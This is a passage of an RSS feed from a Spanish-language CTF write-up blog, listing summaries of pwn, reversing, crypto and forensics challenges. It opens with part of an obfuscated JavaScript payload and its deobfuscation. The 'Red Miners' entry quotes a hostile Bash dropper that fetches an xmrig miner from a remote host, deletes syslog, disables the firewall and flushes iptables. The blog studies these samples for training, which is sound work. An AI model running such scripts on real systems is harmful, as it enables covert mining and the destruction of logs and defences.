TB.__$+HTB.$$_+HTB._$$+(![]+"")[HTB._$_]+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB.$$__+HTB.$$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$$+HTB.$_$$+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$_$+HTB.$__+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$__+HTB.$_$_+HTB.$$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$__+HTB.$$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$__$+HTB.___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$+HTB.$$$_+HTB.$_$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$_$+HTB._$$+HTB.$$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$___+HTB.$$$$+"|"+HTB.___+HTB.___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB._$_+HTB.$__+HTB._$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$__+HTB.$_$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$+HTB.$$$_+HTB.___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$_$+HTB.$$$_+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__$+HTB.$$_$+HTB.$__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$___+HTB.$___+HTB.$_$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$$_+HTB.___+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB._$$+HTB.$__+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$_+HTB.$$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$_$+HTB._$$+HTB._$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$$$+HTB.__$+HTB.$__+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB._$_+HTB.$$_+HTB._$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$+HTB._$$+HTB.$__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$_+HTB.$$__+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$_$+HTB.___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$$_+"|"+HTB.$_$_+"\\"+HTB.__$+HTB.$$_+HTB.$$$+HTB.$_$$+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$__$+HTB.$_$$+HTB.__$+HTB.$$$_+HTB.$$$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB._$_+HTB.$$_+HTB._$$+HTB.$_$_+HTB.$_$_+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$+HTB.$__+HTB.$_$$+HTB.$__+HTB.$$_+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$_+HTB.$__+HTB.$$_$+"|\\"+HTB.__$+HTB.$$_+HTB._$_+HTB.$_$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$_$+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$$+HTB._$_+HTB.$__+"|_"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.$$$+HTB.$_$+HTB.$_$+HTB.$___+HTB.$$_$+"|"+HTB._$+"\\"+HTB.__$+HTB.__$+HTB.__$+"\\"+HTB.__$+HTB.__$+HTB._$$+"\\"+HTB.__$+HTB._$_+HTB.$$_+"\\"+HTB.__$+HTB.__$+HTB._$$+"|"+HTB.$__+HTB.$$$$+"\\"+HTB.__$+HTB.$$$+HTB._$_+"\\"+HTB.__$+HTB.__$+HTB.$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$_$+"|\\"+HTB.__$+HTB._$$+HTB._$_+HTB._+"\\"+HTB.__$+HTB.$_$+HTB._$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$__+"|"+HTB.__+HTB.$$_$+HTB.$$$_+HTB.$$__+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$$+HTB.$$_+"|\\"+HTB.__$+HTB.__$+HTB._$$+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$___+"\\"+HTB.__$+HTB._$_+HTB.$$$+"|\\"+HTB.__$+HTB.$$_+HTB._$_+HTB._$+HTB._+"\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$+HTB.$_$+HTB.__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__$+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$_$+HTB.$$$$+HTB.$__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB._$_+HTB.$$_+HTB.$_$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$__+HTB.$$$+HTB.__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB._$_+HTB.$___+HTB.$__+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$_+HTB.$_$_+HTB.$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$__+HTB.$$$$+HTB.$__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$_$+HTB.$__+HTB.___+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB._$_+HTB.___+HTB.$$_+"|\\"+HTB.__$+HTB.$_$+HTB.$$_+HTB.$$$_+"\\"+HTB.__$+HTB.$$_+HTB.$$$+"\\"+HTB.__$+HTB._$_+HTB._$$+HTB.__+HTB.$_$_+HTB.__+HTB.$$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$$$+HTB.$_$$+HTB.$__$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.__$+HTB.$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$$+HTB.$$__+HTB.$$_+"|"+HTB._$+"\\"+HTB.__$+HTB.$_$+HTB._$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$_+"|\\"+HTB.__$+HTB.___+HTB._$_+HTB._$+HTB._$+(![]+"")[HTB._$_]+HTB.$$$_+HTB.$_$_+"\\"+HTB.__$+HTB.$_$+HTB.$$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$__$+HTB.$$$$+HTB._$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.__$+HTB.$$$$+HTB.$$$_+HTB.$$_$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$$$_+HTB.$$$$+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$$+HTB.___+HTB._$_+"|"+HTB.___+"\\"+HTB.__$+HTB.$$$+HTB.___+HTB.$_$_+"'.\\"+HTB.__$+HTB.$$_+HTB._$$+"\\"+HTB.__$+HTB.$$_+HTB.___+(![]+"")[HTB._$_]+"\\"+HTB.__$+HTB.$_$+HTB.__$+HTB.__+"('|'),"+HTB.___+",{}))\\"+HTB.__$+HTB._$_+"\"")())(); Desofuscación de JavaScript El código anterior está muy ofuscado. Para comenzar a analizarlo, podemos encontrar los primeros puntos y comas y poner saltos de línea:
HTB=~[]; HTB={___:++HTB,$$$$:(![]+"")[HTB],__$:++HTB,$_$_:(![]+"")[HTB],_$_:++HTB,$_$$:({}+"")[HTB],$$_$:(HTB[HTB]+"")[HTB],_$$:++HTB,$$$_:(!""+"")[HTB],$__:++HTB,$_$:++HTB,$$__:({}+"")[HTB],$$_:++HTB,$$$:++HTB,$___:++HTB,$__$:++HTB}; HTB.$_=(HTB.$_=HTB+"")[HTB.$_$]+(HTB._$=HTB.$_[HTB.__$])+(HTB.$$=(HTB.$+"")[HTB.__$])+((!HTB)+"")[HTB._$$]+(HTB.__=HTB.$_[HTB.$$_])+(HTB.$=(!""+"")[HTB.__$])+(HTB._=(!""+"")[HTB._$_])+HTB.$_[HTB.$_$]+HTB.__+HTB._$+HTB.$; HTB.$$=HTB.$+(!""+"")[HTB._$$]+HTB.__+HTB._+HTB.$+HTB.$$; HTB.$=(HTB.___)[HTB.$_][HTB.$_]; // ... Primera etapa Usando el REPL de Node.js, podemos averiguar qué están haciendo esas instrucciones:
$ node Welcome to Node.js v20.0.0. Type ".help" for more information. &amp;gt; HTB=~[]; -1 &amp;gt; &amp;gt; HTB={___:++HTB,$$$$:(!</description></item><item><title>Questionnaire</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/questionnaire/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/questionnaire/</guid><description>Se nos pide contestar a las siguientes preguntas sobre explotación de binarios:
$ nc 161.35.34.21 30758 This is a simple questionnaire to get started with the basics. ◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉◉ ◉ ◉ ◉ When compiling C/C++ source code in Linux, an ELF (Executable and Linkable Format) file is created. ◉ ◉ The flags added when compiling can affect the binary in various ways, like the protections. ◉ ◉ Another thing affected can be the architecture and the way it's linked.</description></item><item><title>Ransom</title><link>https://7rocky.github.io/ctf/htb-challenges/reversing/ransom/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/reversing/ransom/</guid><description>Tenemos un Windows PE llamado windows_update.exe:
$ file windows_update.exe windows_update.exe: PE32+ executable (console) x86-64, for MS Windows Además, hay otro archivo que parece cifrado desde login.xlsx:
$ file login.xlsx.enc login.xlsx.enc: data Descompilación Si abrimos el Windows PE en Ghidra, veremos esta función main:
int __cdecl main(int _Argc, char **_Argv, char **_Env) { char *filename; __main(); if (_Argc == 1) { filename = "C:\\Users"; } else if (_Argc == 2) { filename = _Argv[1]; } else { printf("</description></item><item><title>Rather Secure Attachment</title><link>https://7rocky.github.io/ctf/imaginaryctf/rather-secure-attachment/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/rather-secure-attachment/</guid><description>Se nos proporciona el código fuente en Python utilizado para cifrar la flag:
from Crypto.Util.number import getPrime, bytes_to_long with open('flag.txt','rb') as f: m = bytes_to_long(f.read()) e = 0x10001 k = getPrime(4) l = getPrime(512) p = getPrime(512) q = getPrime(512) n = p*q c = pow(m, e, n) d = pow(2, k, n) f = pow(p, d, l) print(f"c = {c}") print(f"n = {n}") print(f"f = {f}") print(f"l = {l}") Y la salida del script anterior:</description></item><item><title>readme 2023</title><link>https://7rocky.github.io/ctf/other/seccon-ctf/readme-2023/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/seccon-ctf/readme-2023/</guid><description>Se nos proporciona el código fuente en Python que se ejecuta en el servidor:
import mmap import os import signal signal.alarm(60) try: f = open("./flag.txt", "r") mm = mmap.mmap(f.fileno(), 0, prot=mmap.PROT_READ) except FileNotFoundError: print("[-] Flag does not exist") exit(1) while True: path = input("path: ") if 'flag.txt' in path: print("[-] Path not allowed") exit(1) elif 'fd' in path: print("[-] No more fd trick ;)") exit(1) with open(os.path.realpath(path), "rb") as f: print(f.</description></item><item><title>Rebuilding</title><link>https://7rocky.github.io/ctf/htb-challenges/reversing/rebuilding/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/reversing/rebuilding/</guid><description>Se nos proporciona un binario llamado rebuilding:
$ file rebuilding rebuilding: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=c7a145f3a4b213cf895a735e2b26adffc044c190, not stripped Si lo ejecutamos, nos pide poner un argumento de línea de comandos:
$ ./rebuilding Preparing secret keys Missing required argument Vamos a abrirlo en Ghidra para descompilarlo. Esta es la función main:
undefined8 main(int argc, long argv) { int __c; size_t length; undefined8 ret; int checks; int i; int j; if (argc !</description></item><item><title>Red Island</title><link>https://7rocky.github.io/ctf/htb-challenges/web/red-island/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/web/red-island/</guid><description>Tenemos una página web como esta:
Podemos registrar una nueva cuenta e iniciar sesión para ver la siguiente funcionalidad:
Esta vez no tenemos el código fuente de la aplicación web, por lo que tendremos que encontrar una vulnerabilidad clara o encontrar el código fuente de alguna manera.
Podemos comenzar a pensar en Server-Side Request Forgery (SSRF). Como en otros retos, sabemos que el servidor web escucha en el puerto 1337, por lo que vamos a probar http://127.</description></item><item><title>Red Miners</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/red-miners/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/red-miners/</guid><description>Se nos proporciona el siguiente script en Bash:
#!/bin/bash checkTarget() { EXPECTED_USERNAME="root7654" EXPECTED_HOSTNAME_PREFIX="UNZ-" CURRENT_USERNAME=$(whoami) CURRENT_HOSTNAME=$(hostname) if [[ "$CURRENT_USERNAME" != "$EXPECTED_USERNAME" ]]; then exit 1 fi if [[ ! "$CURRENT_HOSTNAME" == "$EXPECTED_HOSTNAME_PREFIX"* ]]; then exit 1 fi } BIN_MD5="96cc922d3eb9ef23859377119332f8d7" BIN_DOWNLOAD_URL="http://tossacoin.htb/xmrig" BIN_DOWNLOAD_URL2="http://tossacoin.htb/xmrig" BIN_NAME="xmrig" cleanEnv() { ulimit -n 65535 rm -rf /var/log/syslog chattr -iua /tmp/ chattr -iua /var/tmp/ chattr -R -i /var/spool/cron chattr -i /etc/crontab ufw disable iptables -F echo "nope" &amp;gt;/tmp/log_rot sudo sysctl kernel.</description></item><item><title>Redaction gone wrong</title><link>https://7rocky.github.io/ctf/picoctf/forensics/redaction-gone-wrong/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/picoctf/forensics/redaction-gone-wrong/</guid><description>Se nos proporciona un archivo PDF llamado Financial_Report_for_ABC_Labs.pdf. Este muestra algo de texto:
Pero vemos que hay palabras que se han ocultado utilizando una especie de &amp;ldquo;color de fondo&amp;rdquo; negro. Sin embargo, podemos usar el ratón para selecctionar el texto, y ahí está la flag:
Financial Report for ABC Labs, Kigali, Rwanda for the year 2021. Breakdown - Just painted over in MS word. Cost Benefit Analysis Credit Debit This is not the flag, keep looking Expenses from the picoCTF{C4n_Y0u_S33_m3_fully} Redacted document.</description></item><item><title>Reflection</title><link>https://7rocky.github.io/ctf/imaginaryctf/reflection/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/reflection/</guid><description>Se nos proporciona un archivo binario llamado reflection:
$ file reflection reflection: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=d57b0acdb0fda3fe599c48fa63ca61e7694b8b60, for GNU/Linux 3.2.0, not stripped Si abrimos Ghidra y echamos un vistazo al código fuente en C descompilado, veremos la función main:
undefined8 main() { long j; char *__format; byte flag_input[100]; int k; int _j; int _length; int i; int length; printf("&amp;gt;&amp;gt;&amp;gt; "); fgets((char *) flag_input, 100, stdin); _length = 0; _j = 0; k = 0; while (true) { length = _length; i = _j; j = (long)_j; _j = _j + 1; if ((flag[j] ^ flag_input[i]) !</description></item><item><title>Reg</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/reg/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/reg/</guid><description>Se nos proporciona un binario de 64 bits llamado reg:
Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x400000) Podemos utilizar Ghidra para analizar el binario y mirar el código fuente en C descompilado. Esta es la función main:
int main() { run(); return 0; } Vamos a ver run:
void run() { char local_38[48]; initialize(); printf("Enter your name : "); gets(local_38); puts("Registered!"); return; } El binario es vulnerable a Buffer Overflow porque la variable llamada local_38 tiene 48 bytes asignados como buffer, pero el programa está usando gets, que es una función insegura ya que no limita la longitud de los datos de entrada, desbordando el buffer reservado si el tamaño de los datos de entrada es mayor que 48 bytes.</description></item><item><title>Relatively Small Arguments</title><link>https://7rocky.github.io/ctf/imaginaryctf/relatively-small-arguments/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/imaginaryctf/relatively-small-arguments/</guid><description>Se nos proporciona el código en Python utilizado para cifrar la flag:
#!/usr/bin/env python3 from Crypto.Util.number import * p = getPrime(512) q = getPrime(512) n = p * q phi = (p - 1) * (q - 1) d = getPrime(32) e = pow(d, -1, phi) m = bytes_to_long(open('flag.txt', 'rb').read()) c = pow(m, e, n) print(f'{n = }') print(f'{e = }') print(f'{c = }') ''' n = 134872711253918655399533296784203466697159038260837702891888089821702090938512308686613559851138816682269099219724900870388583883202954112422023894133671598222066489215524613014212242490437041258588247678792591072443719118562580052842727775772283919113007499992167089258075609504428713653013187230671841726369 e = 50920242742169837294267124730818234703309561711363177522992049271988492365017092545331352650316729342598781520444569769450329777448285534584484096179230968844630486688656705514759778561817709539781927624692111848722199024819005269510690240743887870339853351421726436719236180272680237157536332997570569192069 c = 133155317855020316110137499609990113815646625767974277474197900721563685454745247616867035013963212538345727281661922602291072931578581035070345294335733120033652413487827994383327148598029065495228796201084369245315585407592741900307825557286213370482646401885352854920924352919398804532780740979273692054391 ''' El criptosistema utilizado es RSA, pero la implementación es errónea.</description></item><item><title>Relic Maps</title><link>https://7rocky.github.io/ctf/htb-challenges/forensics/relic-maps/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/forensics/relic-maps/</guid><description>Tenemos esta descripción para el reto:
Pandora received an email with a link claiming to have information about the location of the relic and attached ancient city maps, but something seems off about it. Could it be rivals trying to send her off on a distraction? Or worse, could they be trying to hack her systems to get what she knows? Investigate the given attachment and figure out what&amp;rsquo;s going on and get the flag.</description></item><item><title>Relic Maps</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/relic-maps/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/relic-maps/</guid><description>Tenemos esta descripción para el reto:
Pandora received an email with a link claiming to have information about the location of the relic and attached ancient city maps, but something seems off about it. Could it be rivals trying to send her off on a distraction? Or worse, could they be trying to hack her systems to get what she knows? Investigate the given attachment and figure out what&amp;rsquo;s going on and get the flag.</description></item><item><title>Restricted</title><link>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/restricted/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-cyber-apocalypse/restricted/</guid><description>Se nos proporciona una instancia remota para conectarnos:
$ nc 64.227.41.83 30543 SSH-2.0-OpenSSH_8.4p1 Debian-5+deb11u1 Invalid SSH identification string. Ncat: Broken pipe. Parece que debemos acceder a través de SSH.
Conexión por SSH También se nos proporcionan algunos archivos:
$ tree . ├── Dockerfile ├── build_docker.sh └── src ├── bash_profile ├── flag.txt └── sshd_config 2 directories, 5 files Mirando el DockerFile, vemos que hay un usuario llamado restricted y tiene configurado rbash (Bash restringida):</description></item><item><title>Reverse Polarity</title><link>https://7rocky.github.io/ctf/ctflearn/cryptography/reverse-polarity/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/cryptography/reverse-polarity/</guid><description>Se nos proporciona esta ristra de bits de un disco duro:
10000110101010001000110011011000110010101100001011100100110111001111011010000100110100101110100010111110100011001101100011010010111000001110000011010010110111001111101 Necesitamos representarlo en forma de caracteres legibles. Primero, podemos utilizar Python para expresar el chorros de bits como un número en hexadecimal:
$ python3 -q &amp;gt;&amp;gt;&amp;gt; hex(0b10000110101010001000110011011000110010101100001011100100110111001111011010000100110100101110100010111110100011001101100011010010111000001110000011010010110111001111101) '0x4354466c6561726e7b4269745f466c697070696e7d' Nótese que hay que añadir 0b para que Python interprete el número con base binaria.
Mirando los dígitos en hexadecimal, podemos prever que serán caracteres ASCII (por ejemplo, 0x43 es C, 0x54 es T y 0x46 es F).</description></item><item><title>Reykjavik</title><link>https://7rocky.github.io/ctf/ctflearn/reverse-engineering/reykjavik/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/reverse-engineering/reykjavik/</guid><description>Se nos proporciona un binario de 64 bits llamado Reykjavik:
$ file Reykjavik Reykjavik: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=9bc04368dbcefb4491573ac8feea3a32e31ed59f, for GNU/Linux 3.2.0, not stripped Si lo ejecutamos, vemos que necesita un argumento de línea de comandos:
$ ./Reykjavik Usage: Reykjavik CTFlearn{flag} $ ./Reykjavik 'CTFlearn{flag}' Welcome to the CTFlearn Reversing Challenge Reykjavik v2: CTFlearn{flag} Compile Options: ${CMAKE_CXX_FLAGS} -O0 -fno-stack-protector -mno-sse Sorry Dude, 'CTFlearn{flag}' is not the flag :-( Vamos a usar GDB para depurar el programa.</description></item><item><title>Right Decision</title><link>https://7rocky.github.io/ctf/other/ctfzone/right-decision/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/ctfzone/right-decision/</guid><description>Se nos proporciona el código fuente en Python del servidor:
import random import string import Crypto.Util.number as number import numpy as np import json import socketserver import galois from hashlib import md5 PORT = 31339 with open('params.txt') as f: params = json.load(f) p = params['galois_p'] k = params['k'] n = params['RSA_n'] gf = galois.GF(p,verify=False,primitive_element=2) with open('votes.txt') as f: votes = json.load(f) with open('flag.txt') as f: flag = f.read() def check_secret(s): #check if secret is real phi for public key n return pow(2,s,n)==1 def parse_new_vote(data): all_votes = votes.</description></item><item><title>RIP my bof</title><link>https://7rocky.github.io/ctf/ctflearn/binary/rip-my-bof/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/ctflearn/binary/rip-my-bof/</guid><description>Se nos proporciona un binario de 32 bits llamado server:
Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) También tenemos el código fuente en C. Básicamente, lo que hace el programa es llamar a la función gets, que es vulnerable a Buffer Overflow:
#include &amp;lt;stdio.h&amp;gt; #include &amp;lt;stdlib.h&amp;gt; #include &amp;lt;string.h&amp;gt; #include &amp;lt;unistd.h&amp;gt; // Defined in a separate source file for simplicity. void init_visualize(char* buff); void visualize(char* buff); void win() { system("</description></item><item><title>RiseFromTheDead</title><link>https://7rocky.github.io/ctf/htb-challenges/reversing/risefromthedead/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/reversing/risefromthedead/</guid><description>Se nos proporciona un binario de 64 bits llamado rise y también un archivo core:
$ file * core: ELF 64-bit LSB core file, x86-64, version 1 (SYSV), SVR4-style, from './rise flag', real uid: 0, effective uid: 0, real gid: 0, effective gid: 0, execfn: './rise', platform: 'x86_64' rise: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8341bf2064b7903b6e87d69c63a1849338d3f1e6, for GNU/Linux 3.2.0, not stripped El archivo core se corresponde con la ejecución de rise (en concreto, el comando fue .</description></item><item><title>RiseFromTheDead</title><link>https://7rocky.github.io/ctf/other/htb-unictf/risefromthedead/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/htb-unictf/risefromthedead/</guid><description>Se nos proporciona un binario de 64 bits llamado rise y también un archivo core:
$ file * core: ELF 64-bit LSB core file, x86-64, version 1 (SYSV), SVR4-style, from './rise flag', real uid: 0, effective uid: 0, real gid: 0, effective gid: 0, execfn: './rise', platform: 'x86_64' rise: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=8341bf2064b7903b6e87d69c63a1849338d3f1e6, for GNU/Linux 3.2.0, not stripped El archivo core se corresponde con la ejecución de rise (en concreto, el comando fue .</description></item><item><title>RLotto</title><link>https://7rocky.github.io/ctf/htb-challenges/crypto/rlotto/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/crypto/rlotto/</guid><description>Se nos proporciona el código fuente de un servidor que nos da cinco números y el objetivo es adivinar los cinco números siguientes para ganar la lotería:
$ nc 46.101.63.21 31102 __/\____/\____/\____/\____/\____/\____/\____/\__ \ /\ /\ /\ /\ /\ /\ /\ / /_ _\/_ _\/_ _\/_ _\/_ _\/_ _\/_ _\/_ _\ \/ \/ \/ \/ \/ \/ \/ \/ __ _ _ ____ ___ ____ ___ / / ___ | |_| |_ ___|___ \ / _ \___ \ / _ \ / / / _ \| __| __/ _ \ __) | | | |__) | | | | / /__| (_) | |_| || (_) / __/| |_| / __/| |_| | \____/\___/ \__|\__\___/_____|\___/_____|\___/ __/\____/\____/\____/\____/\____/\____/\____/\__ \ /\ /\ /\ /\ /\ /\ /\ / /_ _\/_ _\/_ _\/_ _\/_ _\/_ _\/_ _\/_ _\ \/ \/ \/ \/ \/ \/ \/ \/ ------------------------------------------------ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 ------------------------------------------------ [+] EXTRACTION: 11 32 87 35 89 [?</description></item><item><title>Robot Factory</title><link>https://7rocky.github.io/ctf/htb-challenges/pwn/robot-factory/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/htb-challenges/pwn/robot-factory/</guid><description>Se nos proporciona un binario de 64 bits llamado robot_factory:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Además, también tenemos la librería de Glibc (libc.so.6). Vamos a parchar el binario con pwninit:
$ pwninit --bin robot_factory --libc libc.so.6 --no-template bin: robot_factory libc: libc.so.6 fetching linker https://launchpad.net/ubuntu/+archive/primary/+files//libc6_2.31-0ubuntu9.2_amd64.deb unstripping libc https://launchpad.net/ubuntu/+archive/primary/+files//libc6-dbg_2.31-0ubuntu9.2_amd64.deb warning: failed unstripping libc: failed running eu-unstrip, please install elfutils: No such file or directory (os error 2) setting .</description></item><item><title>Robot Factory</title><link>https://7rocky.github.io/ctf/other/blackhat-ctf/robot-factory/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/ctf/other/blackhat-ctf/robot-factory/</guid><description>Se nos proporciona un binario de 64 bits llamado main:
Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x400000) Nos dan un Dockerfile que comienza por FROM ubuntu:18.04, así que podemos coger Glibc desde el contenedor y usar pwninit para parchear el binario:
